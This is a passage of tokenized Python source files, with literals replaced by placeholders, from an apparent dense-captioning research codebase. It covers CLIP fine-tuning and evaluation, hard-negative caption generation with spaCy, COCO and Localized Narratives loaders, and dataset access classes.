"<STR_LIT>" ) <EOL> base_clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> loaded = PeftModel . from_pretrained ( base_clip_model , lora_weight_path ) <EOL> loaded = loaded . merge_and_unload ( ) <EOL> run_aro_evals ( loaded , processor ) <EOL> if __name__ == '<STR_LIT>' : <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> clip_processor = CLIPProcessor . from_pretrained ( "<STR_LIT>" ) <EOL> run_aro_evals ( clip_model , clip_processor ) <EOL> </s>
<s> import os <EOL> import os <EOL> from urllib . request import urlretrieve <EOL> from tqdm import tqdm <EOL> import json as js <EOL> def image_url_download ( url_file , to_folder ) : <EOL> count = <NUM_LIT> <EOL> if not os . path . exists ( to_folder ) : <EOL> os . mkdir ( to_folder ) <EOL> contents = js . load ( open ( url_file , '<STR_LIT>' ) ) <EOL> for img in tqdm ( contents ) : <EOL> if not os . path . exists ( os . path . join ( to_folder , img ) ) : <EOL> try : <EOL> urlretrieve ( contents [ img ] , os . path . join ( to_folder , img ) ) <EOL> except : <EOL> count += <NUM_LIT> <EOL> print ( count ) <EOL> if __name__ == '<STR_LIT>' : <EOL> import sys <EOL> if len ( sys . argv ) != <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> image_url_download ( sys . argv [ <NUM_LIT> ] , sys . argv [ <NUM_LIT> ] ) <EOL> </s>
<s> import random <EOL> import spacy <EOL> from densely_captioned_images . dataset . utils import get_clip_token_length <EOL> _loaded_en_nlp = None <EOL> ADJ_ANTONYM_RATE = <NUM_LIT> <EOL> def get_english ( ) : <EOL> global _loaded_en_nlp <EOL> if _loaded_en_nlp is None : <EOL> _loaded_en_nlp = spacy . load ( "<STR_LIT>" ) <EOL> return _loaded_en_nlp <EOL> def get_wordnet ( ) : <EOL> from nltk . corpus import wordnet <EOL> return wordnet <EOL> def get_antonyms ( phrase ) : <EOL> wordnet = get_wordnet ( ) <EOL> antonyms = [ ] <EOL> for syn in wordnet . synsets ( phrase ) : <EOL> for l in syn . lemmas ( ) : <EOL> if l . antonyms ( ) : <EOL> antonyms . append ( l . antonyms ( ) [ <NUM_LIT> ] . name ( ) ) <EOL> return list ( set ( antonyms ) ) <EOL> def levenshtein_distance ( s1 , s2 ) : <EOL> if len ( s1 ) > len ( s2 ) : <EOL> s1 , s2 = s2 , s1 <EOL> distances = range ( len ( s1 ) + <NUM_LIT> ) <EOL> for i2 , c2 in enumerate ( s2 ) : <EOL> distances_ = [ i2 + <NUM_LIT> ] <EOL> for i1 , c1 in enumerate ( s1 ) : <EOL> if c1 == c2 : <EOL> distances_ . append ( distances [ i1 ] ) <EOL> else : <EOL> distances_ . append ( <NUM_LIT> + min ( ( distances [ i1 ] , distances [ i1 + <NUM_LIT> ] , distances_ [ - <NUM_LIT> ] ) ) ) <EOL> distances = distances_ <EOL> return distances [ - <NUM_LIT> ] <EOL> def different_enough ( s1 , s2 ) : <EOL> if s1 . lower ( ) in s2 . lower ( ) or s2 . lower ( ) in s1 . lower ( ) : <EOL> return False <EOL> return levenshtein_distance ( s1 , s2 ) / min ( len ( s1 ) , len ( s2 ) ) > <NUM_LIT> <EOL> def process_swaps_single_pass ( in_text , swaps ) : <EOL> chunks = { } <EOL> starts = [ ] <EOL> ends = [ ] <EOL> for ( ( s1 , e1 ) , tuple_or_word ) in swaps : <EOL> if isinstance ( tuple_or_word , str ) : <EOL> chunks [ ( s1 , e1 ) ] = tuple_or_word <EOL> starts . append ( s1 ) <EOL> ends . append ( e1 ) <EOL> else : <EOL> s2 , e2 = tuple_or_word <EOL> chunks [ ( s1 , e1 ) ] = in_text [ s2 : e2 ] <EOL> chunks [ ( s2 , e2 ) ] = in_text [ s1 : e1 ] <EOL> starts += [ s1 , s2 ] <EOL> ends += [ e1 , e2 ] <EOL> starts . sort ( ) <EOL> ends . sort ( ) <EOL> if starts [ <NUM_LIT> ] != <NUM_LIT> : <EOL> ends = [ starts [ <NUM_LIT> ] ] + ends <EOL> starts = [ <NUM_LIT> ] + starts <EOL> if ends [ - <NUM_LIT> ] != len ( in_text ) : <EOL> starts = starts + [ ends [ - <NUM_LIT> ] ] <EOL> ends = ends + [ len ( in_text ) ] <EOL> for s in starts : <EOL> if s != <NUM_LIT> and s not in ends : <EOL> ends . append ( s ) <EOL> for e in ends : <EOL> if e != len ( in_text ) and e not in starts : <EOL> starts . append ( e ) <EOL> starts . sort ( ) <EOL> ends . sort ( ) <EOL> res_text = "<STR_LIT>" <EOL> for ( s , e ) in zip ( starts , ends ) : <EOL> if ( s , e ) in chunks : <EOL> to_add = chunks [ ( s , e ) ] <EOL> else : <EOL> to_add = in_text [ s : e ] <EOL> res_text += to_add <EOL> return res_text <EOL> def get_spacy_negative ( in_text , swap_count = <NUM_LIT> , use_antonyms = False ) : <EOL> nlp = get_english ( ) <EOL> out_text = in_text <EOL> doc = nlp ( out_text ) <EOL> def get_possible_swaps ( swap_source , max_swaps = <NUM_LIT> ) : <EOL> used_elems = set ( ) <EOL> swaps = [ ] <EOL> while len ( swaps ) < max_swaps and len ( swap_source ) > <NUM_LIT> : <EOL> elem = swap_source . pop ( <NUM_LIT> ) <EOL> if elem . text in used_elems : <EOL> continue <EOL> used_elems . add ( elem . text ) <EOL> if use_antonyms and hasattr ( elem , '<STR_LIT>' ) and elem . pos_ == "<STR_LIT>" and random . random ( ) < ADJ_ANTONYM_RATE : <EOL> antonyms = get_antonyms ( elem . text ) <EOL> if len ( antonyms ) > <NUM_LIT> : <EOL> swaps . append ( ( ( elem . idx , elem . idx + len ( elem ) ) , random . choice ( antonyms ) ) ) <EOL> continue <EOL> possible_swaps = [ n for n in swap_source if different_enough ( n . text , elem . text ) and n . text not in used_elems ] <EOL> if len ( possible_swaps ) == <NUM_LIT> : <EOL> continue <EOL> swap_elem = random . choice ( possible_swaps ) <EOL> used_elems . add ( swap_elem . text ) <EOL> try : <EOL> swaps . append ( ( ( elem . start_char , elem . end_char ) , ( swap_elem . start_char , swap_elem . end_char ) ) ) <EOL> except : <EOL> swaps . append ( ( <EOL> ( elem . idx , elem . idx + len ( elem ) ) , <EOL> ( swap_elem . idx , swap_elem . idx + len ( swap_elem ) ) <EOL> ) ) <EOL> return swaps <EOL> noun_phrases = [ noun_phrase for noun_phrase in doc . noun_chunks ] <EOL> random . shuffle ( noun_phrases ) <EOL> swaps = get_possible_swaps ( noun_phrases , swap_count ) <EOL> if len ( swaps ) > <NUM_LIT> : <EOL> out_text = process_swaps_single_pass ( out_text , swaps ) <EOL> doc = nlp ( out_text ) <EOL> adjectives = [ tok for tok in doc if tok . pos_ == "<STR_LIT>" ] <EOL> random . shuffle ( adjectives ) <EOL> swaps = get_possible_swaps ( adjectives , swap_count ) <EOL> verbs = [ tok for tok in doc if tok . pos_ == "<STR_LIT>" ] <EOL> random . shuffle ( verbs ) <EOL> swaps += get_possible_swaps ( verbs , swap_count ) <EOL> if len ( swaps ) == <NUM_LIT> : <EOL> return out_text <EOL> out_text = process_swaps_single_pass ( out_text , swaps ) <EOL> if get_clip_token_length ( out_text ) >= <NUM_LIT> : <EOL> return get_spacy_negative ( in_text , swap_count = swap_count , use_antonyms = False ) <EOL> return out_text <EOL> </s>
<s> import torch <EOL> import os <EOL> from tqdm import tqdm <EOL> from typing import Dict , List , Any , Callable , Optional , Tuple <EOL> from densely_captioned_images . repro . eval . localized_narratives . localized_narratives import DataLoader as LocNarDataLoader <EOL> from PIL import Image <EOL> from densely_captioned_images . dataset . utils import get_clip_processor , get_clip_token_length <EOL> from densely_captioned_images . repro . config import COCO_TRAIN2017_DATAPATH , COCO_VALID2017_DATAPATH , LOCALIZED_NARRATIVES_DATAPATH <EOL> from densely_captioned_images . dataset . spacy_negs import get_spacy_negative <EOL> def get_dataset_source ( split = '<STR_LIT>' , count = <NUM_LIT> , use_antonyms = False ) : <EOL> if split == '<STR_LIT>' : <EOL> source_dir = COCO_TRAIN2017_DATAPATH <EOL> ln_split = '<STR_LIT>' <EOL> elif split == '<STR_LIT>' : <EOL> source_dir = COCO_VALID2017_DATAPATH <EOL> ln_split = '<STR_LIT>' <EOL> else : <EOL> raise NotImplementedError ( '<STR_LIT>' ) <EOL> loader = LocNarDataLoader ( LOCALIZED_NARRATIVES_DATAPATH ) <EOL> res = [ ] <EOL> count_so_far = <NUM_LIT> <EOL> skipped = <NUM_LIT> <EOL> for n in tqdm ( loader . load_annotations ( ln_split ) ) : <EOL> toks = get_clip_token_length ( n . caption ) <EOL> if toks > <NUM_LIT> : <EOL> skipped += <NUM_LIT> <EOL> continue <EOL> image_path = os . path . join ( source_dir , f"<STR_LIT>" ) <EOL> res . append ( { <EOL> "<STR_LIT>" : image_path , <EOL> "<STR_LIT>" : n . caption , <EOL> "<STR_LIT>" : get_spacy_negative ( n . caption , use_antonyms = use_antonyms ) , <EOL> } ) <EOL> count_so_far += <NUM_LIT> <EOL> if count_so_far == count : <EOL> break <EOL> return res <EOL> class COCOLocalizedNarrativesDataset ( torch . utils . data . Dataset ) : <EOL> def __init__ ( self , dataset_source ) : <EOL> self . data_list = dataset_source <EOL> self . processor = get_clip_processor ( ) <EOL> def __getitem__ ( self , idx ) : <EOL> item = self . data_list [ idx ] <EOL> image = Image . open ( item [ '<STR_LIT>' ] ) <EOL> inputs = self . processor ( text = [ item [ '<STR_LIT>' ] ] , images = [ image ] , return_tensors = "<STR_LIT>" , padding = "<STR_LIT>" ) <EOL> negatives = self . processor ( text = [ item [ '<STR_LIT>' ] ] , images = [ image ] , return_tensors = "<STR_LIT>" , padding = "<STR_LIT>" ) <EOL> res = { <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : negatives [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : negatives [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> } <EOL> return res <EOL> def __len__ ( self ) : <EOL> return len ( self . data_list ) <EOL> </s>
<s> import torch <EOL> import os <EOL> import json <EOL> import random <EOL> from tqdm import tqdm <EOL> from typing import Dict , List , Any , Callable , Optional , Tuple <EOL> from PIL import Image <EOL> from densely_captioned_images . dataset . utils import get_clip_processor , get_clip_token_length <EOL> from densely_captioned_images . repro . config import COCO_TRAIN2017_DATAPATH , COCO_VALID2017_DATAPATH , COCO_TRAIN2017_ANNOTATION_PATH , COCO_VALID2017_ANNOTATION_PATH <EOL> from densely_captioned_images . dataset . spacy_negs import get_spacy_negative <EOL> def get_dataset_source ( split = '<STR_LIT>' , count = <NUM_LIT> , use_antonyms = False ) : <EOL> if split == '<STR_LIT>' : <EOL> source_dir = COCO_TRAIN2017_DATAPATH <EOL> annotation_dir = COCO_TRAIN2017_ANNOTATION_PATH <EOL> elif split == '<STR_LIT>' : <EOL> source_dir = COCO_VALID2017_DATAPATH <EOL> annotation_dir = COCO_VALID2017_ANNOTATION_PATH <EOL> else : <EOL> raise NotImplementedError ( '<STR_LIT>' ) <EOL> with open ( annotation_dir ) as coco_fp : <EOL> coco_annotations = json . load ( coco_fp ) <EOL> coco_by_img_id = { v [ '<STR_LIT>' ] : v for v in coco_annotations [ '<STR_LIT>' ] } <EOL> for v in coco_by_img_id . values ( ) : <EOL> v [ '<STR_LIT>' ] = [ ] <EOL> for captions in coco_annotations [ '<STR_LIT>' ] : <EOL> coco_by_img_id [ captions [ '<STR_LIT>' ] ] [ '<STR_LIT>' ] . append ( captions [ '<STR_LIT>' ] ) <EOL> res = [ ] <EOL> count_so_far = <NUM_LIT> <EOL> skipped = <NUM_LIT> <EOL> for n in tqdm ( coco_by_img_id . values ( ) ) : <EOL> all_good = True <EOL> for caption in n [ '<STR_LIT>' ] : <EOL> toks = get_clip_token_length ( caption ) <EOL> if toks > <NUM_LIT> : <EOL> all_good = False <EOL> break <EOL> if not all_good : <EOL> skipped += <NUM_LIT> <EOL> continue <EOL> image_path = os . path . join ( source_dir , n [ '<STR_LIT>' ] ) <EOL> res . append ( { <EOL> "<STR_LIT>" : image_path , <EOL> "<STR_LIT>" : n [ '<STR_LIT>' ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : n [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : get_spacy_negative ( n [ '<STR_LIT>' ] [ <NUM_LIT> ] , use_antonyms = use_antonyms ) , <EOL> } ) <EOL> count_so_far += <NUM_LIT> <EOL> if count_so_far == count : <EOL> break <EOL> return res <EOL> class COCODataset ( torch . utils . data . Dataset ) : <EOL> def __init__ ( self , dataset_source , caption_bag_size = <NUM_LIT> ) : <EOL> self . data_list = dataset_source <EOL> self . processor = get_clip_processor ( ) <EOL> assert caption_bag_size <= <NUM_LIT> , "<STR_LIT>" <EOL> self . caption_bag_size = caption_bag_size <EOL> def __getitem__ ( self , idx ) : <EOL> item = self . data_list [ idx ] <EOL> image = Image . open ( item [ '<STR_LIT>' ] ) <EOL> inputs = self . processor ( text = [ item [ '<STR_LIT>' ] ] , images = [ image ] , return_tensors = "<STR_LIT>" , padding = "<STR_LIT>" ) <EOL> negatives = self . processor ( text = [ item [ '<STR_LIT>' ] ] , images = [ image ] , return_tensors = "<STR_LIT>" , padding = "<STR_LIT>" ) <EOL> res = { <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : negatives [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : negatives [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] , <EOL> } <EOL> if item . get ( '<STR_LIT>' ) is not None and self . caption_bag_size > <NUM_LIT> : <EOL> use_captions = random . sample ( item [ '<STR_LIT>' ] , self . caption_bag_size ) <EOL> bag_inputs = self . processor ( text = use_captions , images = [ image ] , return_tensors = "<STR_LIT>" , padding = "<STR_LIT>" ) <EOL> res [ '<STR_LIT>' ] = bag_inputs [ '<STR_LIT>' ] <EOL> res [ '<STR_LIT>' ] = bag_inputs [ '<STR_LIT>' ] <EOL> return res <EOL> def __len__ ( self ) : <EOL> return len ( self . data_list ) <EOL> </s>
<s> import requests <EOL> from tqdm import tqdm <EOL> def download_file_from_google_drive ( id , destination ) : <EOL> def get_confirm_token ( response ) : <EOL> if '<STR_LIT>' in response . text : <EOL> key = response . text . split ( '<STR_LIT>' ) [ <NUM_LIT> ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> return key <EOL> return None <EOL> def save_response_content ( response , destination ) : <EOL> CHUNK_SIZE = <NUM_LIT> * <NUM_LIT> <EOL> with open ( destination , "<STR_LIT>" ) as f : <EOL> for chunk in tqdm ( response . iter_content ( CHUNK_SIZE ) ) : <EOL> if chunk : <EOL> f . write ( chunk ) <EOL> URL = "<STR_LIT>" <EOL> session = requests . Session ( ) <EOL> response = session . get ( URL , params = { '<STR_LIT>' : id } , stream = True ) <EOL> token = get_confirm_token ( response ) <EOL> if token : <EOL> params = { '<STR_LIT>' : id , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : token } <EOL> response = session . get ( URL , params = params , stream = True ) <EOL> save_response_content ( response , destination ) <EOL> if __name__ == "<STR_LIT>" : <EOL> import sys <EOL> if len ( sys . argv ) != <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> file_id = sys . argv [ <NUM_LIT> ] <EOL> destination = sys . argv [ <NUM_LIT> ] <EOL> download_file_from_google_drive ( file_id , destination ) <EOL> </s>
<s> import torch <EOL> from transformers import Trainer <EOL> import datasets <EOL> from transformers . trainer_utils import seed_worker <EOL> from torch . utils . data import DataLoader , SequentialSampler , RandomSampler <EOL> from densely_captioned_images . dataset . loss import clip_loss , negatives_loss <EOL> from densely_captioned_images . dataset . impl import DenseCaptionBatchSampler <EOL> from typing import Optional <EOL> available_gpus = [ torch . cuda . device ( i ) for i in range ( torch . cuda . device_count ( ) ) ] <EOL> total_gpus = len ( available_gpus ) <EOL> ALPHA = <NUM_LIT> <EOL> BETA = <NUM_LIT> <EOL> def compute_metrics ( eval_pred ) : <EOL> global last_eval_pred <EOL> with torch . no_grad ( ) : <EOL> c_loss = eval_pred . predictions [ <NUM_LIT> ] . mean ( ) <EOL> n_loss = eval_pred . predictions [ <NUM_LIT> ] . mean ( ) <EOL> return { '<STR_LIT>' : c_loss , '<STR_LIT>' : n_loss } <EOL> class ClipAndNegTrainer ( Trainer ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> self . _la : float = kwargs . pop ( '<STR_LIT>' , ALPHA ) <EOL> self . _lb : float = kwargs . pop ( '<STR_LIT>' , BETA ) <EOL> self . _sampler_choice : str = kwargs . pop ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> self . _loss_pool_type : str = kwargs . pop ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> super ( ) . __init__ ( * args , ** kwargs ) <EOL> def _a ( self ) : <EOL> return self . _la <EOL> def _b ( self ) : <EOL> return self . _lb <EOL> def get_train_dataloader ( self ) -> DataLoader : <EOL> if self . train_dataset is None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> train_dataset = self . train_dataset <EOL> data_collator = self . data_collator <EOL> if isinstance ( train_dataset , datasets . Dataset ) : <EOL> train_dataset = self . _remove_unused_columns ( train_dataset , description = "<STR_LIT>" ) <EOL> else : <EOL> data_collator = self . _get_collator_with_removed_columns ( data_collator , description = "<STR_LIT>" ) <EOL> dataloader_params = { <EOL> "<STR_LIT>" : self . _train_batch_size , <EOL> "<STR_LIT>" : data_collator , <EOL> "<STR_LIT>" : self . args . dataloader_num_workers , <EOL> "<STR_LIT>" : self . args . dataloader_pin_memory , <EOL> } <EOL> if not isinstance ( train_dataset , torch . utils . data . IterableDataset ) : <EOL> sampler = self . _get_train_sampler ( ) <EOL> if isinstance ( sampler , torch . utils . data . BatchSampler ) : <EOL> dataloader_params [ "<STR_LIT>" ] = sampler <EOL> del dataloader_params [ '<STR_LIT>' ] <EOL> else : <EOL> dataloader_params [ "<STR_LIT>" ] = sampler <EOL> dataloader_params [ "<STR_LIT>" ] = self . args . dataloader_drop_last <EOL> dataloader_params [ "<STR_LIT>" ] = seed_worker <EOL> print ( dataloader_params ) <EOL> return self . accelerator . prepare ( DataLoader ( train_dataset , ** dataloader_params ) ) <EOL> def _get_train_sampler ( self ) -> Optional [ torch . utils . data . Sampler ] : <EOL> if self . _sampler_choice == '<STR_LIT>' : <EOL> return RandomSampler ( self . train_dataset ) <EOL> elif self . _sampler_choice == '<STR_LIT>' : <EOL> return SequentialSampler ( self . train_dataset ) <EOL> elif self . _sampler_choice == '<STR_LIT>' : <EOL> return DenseCaptionBatchSampler ( self . train_dataset , self . _train_batch_size ) <EOL> else : <EOL> raise NotImplementedError <EOL> def compute_loss ( self , model , inputs , return_outputs = False ) : <EOL> if '<STR_LIT>' in inputs : <EOL> bs , n , t = inputs [ '<STR_LIT>' ] . shape <EOL> unstacked_inputs = inputs [ '<STR_LIT>' ] . reshape ( bs * n , t ) <EOL> unstacked_attention = inputs [ '<STR_LIT>' ] . reshape ( bs * n , t ) <EOL> pos_inputs = { <EOL> '<STR_LIT>' : unstacked_inputs . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : unstacked_attention . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) , <EOL> } <EOL> else : <EOL> pos_inputs = { <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) , <EOL> } <EOL> outputs = model ( ** pos_inputs ) <EOL> logits = outputs . logits_per_image <EOL> c_loss = clip_loss ( logits , pool_type = self . _loss_pool_type ) <EOL> if self . _b ( ) == <NUM_LIT> and not return_outputs : <EOL> return self . _a ( ) * c_loss <EOL> if '<STR_LIT>' in inputs : <EOL> bs , n , t = inputs [ '<STR_LIT>' ] . shape <EOL> unstacked_inputs = inputs [ '<STR_LIT>' ] . reshape ( bs * n , t ) <EOL> unstacked_attention = inputs [ '<STR_LIT>' ] . reshape ( bs * n , t ) <EOL> neg_inputs = { <EOL> '<STR_LIT>' : unstacked_inputs . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : unstacked_attention . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) , <EOL> } <EOL> else : <EOL> neg_inputs = { <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) . repeat ( total_gpus , <NUM_LIT> ) , <EOL> '<STR_LIT>' : torch . squeeze ( inputs [ '<STR_LIT>' ] , axis = <NUM_LIT> ) , <EOL> } <EOL> neg_outputs = model ( ** neg_inputs ) <EOL> n_loss = negatives_loss ( logits , neg_outputs . logits_per_image , pool_type = self . _loss_pool_type ) <EOL> loss = self . _a ( ) * c_loss + self . _b ( ) * n_loss <EOL> outputs [ '<STR_LIT>' ] = c_loss <EOL> outputs [ '<STR_LIT>' ] = n_loss <EOL> return ( loss , outputs ) if return_outputs else loss <EOL> </s>
<s> from densely_captioned_images . dataset . utils import get_clip_token_length <EOL> from densely_captioned_images . dataset . config import DATASET_PHOTO_PATH , DATASET_COMPLETE_PATH <EOL> from PIL import Image <EOL> from io import BytesIO <EOL> import numpy as np <EOL> import os <EOL> import json <EOL> import base64 <EOL> from typing import Optional , List , Dict , TypedDict , Union <EOL> class DCIEntry ( TypedDict ) : <EOL> image : np . ndarray <EOL> caption : str <EOL> key : str <EOL> class PointDict ( TypedDict ) : <EOL> x : int <EOL> y : int <EOL> class BoundDict ( TypedDict ) : <EOL> topLeft : PointDict <EOL> bottomRight : PointDict <EOL> class NegativeEntry ( TypedDict ) : <EOL> swaps : List [ str ] <EOL> layout : List [ str ] <EOL> basic : List [ str ] <EOL> DCISummaries = Dict [ str , str ] <EOL> DCINegatives = Dict [ str , NegativeEntry ] <EOL> class MaskDataEntry ( TypedDict ) : <EOL> outer_mask : str <EOL> area : int <EOL> bounds : BoundDict <EOL> idx : int <EOL> requirements : List [ int ] <EOL> parent : int <EOL> label : str <EOL> caption : str <EOL> mask_quality : int <EOL> class DCIBaseData ( TypedDict ) : <EOL> short_caption : str <EOL> extra_caption : str <EOL> image : str <EOL> mask_data : Dict [ str , MaskDataEntry ] <EOL> mask_keys : List [ str ] <EOL> class DCIExtendedData ( DCIBaseData ) : <EOL> img : np . ndarray <EOL> height : int <EOL> _id : int <EOL> _entry_key : str <EOL> _source : str <EOL> ENTRIES = None <EOL> ENTRIES_MAP = None <EOL> ENTRIES_REVERSE_MAP = None <EOL> def init_entries ( source : str = DATASET_COMPLETE_PATH ) -> None : <EOL> global ENTRIES , ENTRIES_MAP , ENTRIES_REVERSE_MAP <EOL> ENTRIES = os . listdir ( source ) <EOL> ENTRIES_MAP = { str ( i ) : e for i , e in enumerate ( ENTRIES ) } <EOL> ENTRIES_REVERSE_MAP = { str ( e ) : i for i , e in enumerate ( ENTRIES ) } <EOL> def get_dci_count ( ) -> int : <EOL> if ENTRIES_MAP is None : <EOL> init_entries ( ) <EOL> return len ( ENTRIES_MAP ) <EOL> def get_key_for ( idx : Union [ int , str ] ) -> str : <EOL> if ENTRIES_MAP is None : <EOL> init_entries ( ) <EOL> return ENTRIES_MAP . get ( str ( idx ) ) <EOL> def load_image ( entry_key : str ) -> DCIExtendedData : <EOL> if ENTRIES is None : <EOL> init_entries ( ) <EOL> if entry_key in ENTRIES_MAP : <EOL> entry_key = ENTRIES_MAP [ entry_key ] <EOL> complete_path = os . path . join ( DATASET_COMPLETE_PATH , entry_key ) <EOL> with open ( complete_path ) as entry_file : <EOL> base_data : DCIBaseData = json . load ( entry_file ) <EOL> img = Image . open ( os . path . join ( DATASET_PHOTO_PATH , base_data [ '<STR_LIT>' ] ) ) <EOL> width , height = img . size <EOL> base_data [ '<STR_LIT>' ] = width <EOL> base_data [ '<STR_LIT>' ] = height <EOL> base_data [ '<STR_LIT>' ] = np . array ( img ) <EOL> base_data [ '<STR_LIT>' ] = ENTRIES_REVERSE_MAP [ entry_key ] <EOL> base_data [ '<STR_LIT>' ] = entry_key <EOL> base_data [ '<STR_LIT>' ] = os . path . join ( DATASET_COMPLETE_PATH , entry_key ) <EOL> return base_data <EOL> class DenseCaptionedImage ( ) : <EOL> def __init__ ( self , img_id : int ) : <EOL> self . _data : DCIExtendedData = load_image ( str ( img_id ) ) <EOL> self . _id : int = img_id <EOL> def get_summaries ( self ) -> Optional [ DCISummaries ] : <EOL> return self . _data . get ( '<STR_LIT>' ) <EOL> def get_negatives ( self ) -> Optional [ DCINegatives ] : <EOL> return self . _data . get ( '<STR_LIT>' ) <EOL> def get_mask ( self , idx : int ) -> MaskDataEntry : <EOL> return self . _data [ '<STR_LIT>' ] . get ( str ( idx ) ) <EOL> def get_all_masks ( self ) -> List [ MaskDataEntry ] : <EOL> return list ( self . _data [ '<STR_LIT>' ] . values ( ) ) <EOL> def filter_masks_by_size ( <EOL> self , <EOL> min_height : int = <NUM_LIT> , <EOL> min_width : int = <NUM_LIT> , <EOL> min_length : int = <NUM_LIT> , <EOL> max_length : Optional [ int ] = None <EOL> ) -> List [ MaskDataEntry ] : <EOL> all_masks = self . get_all_masks ( ) <EOL> if min_height == <NUM_LIT> and min_width == <NUM_LIT> and min_length == <NUM_LIT> and max_length is None : <EOL> return all_masks <EOL> def mask_is_bigger ( mask : MaskDataEntry ) -> bool : <EOL> if min_length > <NUM_LIT> or max_length is not None : <EOL> caption_len = get_clip_token_length ( self . _extract_caption ( mask ) ) <EOL> if caption_len < min_length or ( max_length is not None and caption_len > max_length ) : <EOL> return False <EOL> crop_dims = mask [ '<STR_LIT>' ] <EOL> width = crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> height = crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> return width >= min_width and height >= min_height <EOL> return [ m for m in all_masks if mask_is_bigger ( m ) ] <EOL> def _extract_caption ( self , mask ) -> Optional [ str ] : <EOL> if mask [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> return None <EOL> elif mask [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> return mask [ '<STR_LIT>' ] <EOL> return f"<STR_LIT>" <EOL> def _get_max_depth ( self , mask ) -> int : <EOL> submasks = [ self . get_mask ( m ) for m in mask [ '<STR_LIT>' ] ] <EOL> submasks = [ m for m in submasks if m is not None ] <EOL> if len ( submasks ) == <NUM_LIT> : <EOL> return <NUM_LIT> <EOL> return <NUM_LIT> + max ( [ self . _get_max_depth ( m ) for m in submasks ] ) <EOL> def get_all_submasks_dfs ( <EOL> self , <EOL> mask : MaskDataEntry , <EOL> max_depth : int , <EOL> include_self : bool = True <EOL> ) -> List [ MaskDataEntry ] : <EOL> if include_self : <EOL> res = [ mask ] <EOL> else : <EOL> res = [ ] <EOL> if max_depth == <NUM_LIT> : <EOL> return res <EOL> submasks = [ self . get_mask ( m ) for m in mask [ '<STR_LIT>' ] ] <EOL> submasks = [ m for m in submasks if m is not None and m [ '<STR_LIT>' ] != <NUM_LIT> ] <EOL> for submask in submasks : <EOL> res += self . get_all_submasks_dfs ( submask , max_depth - <NUM_LIT> ) <EOL> return res <EOL> def get_caption_with_subcaptions ( self , mask , max_depth = <NUM_LIT> ) -> List [ DCIEntry ] : <EOL> submasks = self . get_all_submasks_dfs ( mask , max_depth = max_depth , include_self = False ) <EOL> base_caption = f"<STR_LIT>" <EOL> captions = [ self . _extract_caption ( m ) for m in submasks ] <EOL> captions = [ c for c in captions if c is not None ] <EOL> all_captions = "<STR_LIT>" . join ( captions ) <EOL> if len ( captions ) > <NUM_LIT> : <EOL> caption = f"<STR_LIT>" <EOL> else : <EOL> caption = base_caption <EOL> return [ <EOL> { '<STR_LIT>' : self . get_subimage ( mask ) , '<STR_LIT>' : caption , '<STR_LIT>' : f'<STR_LIT>' } <EOL> ] <EOL> def get_image ( self ) -> np . ndarray : <EOL> return self . _data [ '<STR_LIT>' ] <EOL> def get_subimage ( self , mask , pad_amount = <NUM_LIT> , apply_mask = False ) -> np . ndarray : <EOL> base_image = self . get_image ( ) <EOL> if apply_mask : <EOL> mask_array = np . array ( Image . open ( BytesIO ( base64 . b64decode ( mask [ '<STR_LIT>' ] ) ) ) ) <EOL> mask_tiled = np . tile ( mask_array , ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) . transpose ( ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> base_image = base_image * mask_tiled + ( base_image // <NUM_LIT> + <NUM_LIT> ) * ( <NUM_LIT> - mask_tiled ) <EOL> base_image = base_image . astype ( np . uint8 ) <EOL> x1 , y1 , x2 , y2 = <NUM_LIT> , <NUM_LIT> , self . _data [ '<STR_LIT>' ] , self . _data [ '<STR_LIT>' ] <EOL> crop_dims = mask [ '<STR_LIT>' 